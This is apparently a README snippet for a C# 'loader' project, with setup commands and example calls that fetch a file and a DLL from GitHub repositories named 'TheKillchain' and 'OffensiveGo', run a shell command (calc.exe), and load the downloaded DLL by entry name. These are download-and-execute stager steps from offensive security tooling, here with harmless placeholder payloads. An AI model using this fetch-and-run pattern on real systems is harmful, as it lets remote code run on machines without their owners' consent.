Project Setup
```
dotnet new console --output loader
dotnet run --project loader
```


Example tests for the loader main function:
```c#
string file = "test.json";
string fileLocation = "https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/calculator.json";
GetFile(fileLocation, file);

string command = "/c calc.exe";
RunCommand(command);

string remoteDllUrl = "https://github.com/bakarilevy/OffensiveGo/blob/main/message_box/example.dll?raw=true";
string localDllName = "messagebox.dll";
string dllEntryName = "Test";
DllLoader(remoteDllUrl, localDllName, dllEntryName);
```